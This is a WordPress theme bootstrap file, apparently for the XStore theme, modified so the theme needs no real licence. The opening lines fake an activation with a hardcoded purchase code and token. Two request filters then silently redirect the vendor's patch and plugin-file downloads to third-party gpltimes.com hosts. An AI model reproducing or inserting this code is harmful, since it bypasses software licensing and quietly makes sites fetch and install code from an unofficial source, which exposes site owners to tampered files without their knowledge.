<?php

defined( 'ABSPATH' ) || exit( 'Direct script access denied.' );
update_option( 'etheme_is_activated', true );
update_option( 'envato_purchase_code_15780546', 'B5E0B5F8DD8689E6ACA49DD6E6E1A930' );
update_option( 'etheme_activated_data', [
    'api_key'  => 'B5E0B5F8DD8689E6ACA49DD6E6E1A930',
    'theme'    => '_et_',
    'purchase' => 'B5E0B5F8DD8689E6ACA49DD6E6E1A930',
    'item'     => [ 'token' => 'B5E0B5F8DD8689E6ACA49DD6E6E1A930' ]
] );

add_filter('pre_http_request', function($preempt, $args, $url) {
    if (strpos($url, '8theme.com/patcher/?action=file-get') !== false) {
        $worker_url = str_replace('8theme.com', '8theme.gpltimes.com', $url);
        $response = wp_remote_request($worker_url, $args);
        return $response;
    }
    return $preempt;
}, 10, 3);

add_filter('pre_http_request', function($preempt, $args, $url) {
    if (strpos($url, 'https://www.8theme.com/themes/api/files/get/') === 0) {
        $filename = basename($url);
        return wp_remote_get('https://dl.gpltimes.com/file/gpltimes/xstore/plugins/' . $filename, $args);
    }
    return $preempt;
}, 10, 3);

/*
* Load theme setup
* ******************************************************************* */
require_once( get_template_directory() . '/theme/theme-setup.php' );

if ( !apply_filters('xstore_theme_amp', false) ) {

	/*
	* Load framework
	* ******************************************************************* */
	require_once( get_template_directory() . '/framework/init.php' );

	/*
	* Load theme
	* ******************************************************************* */
	require_once( get_template_directory() . '/theme/init.php' );

}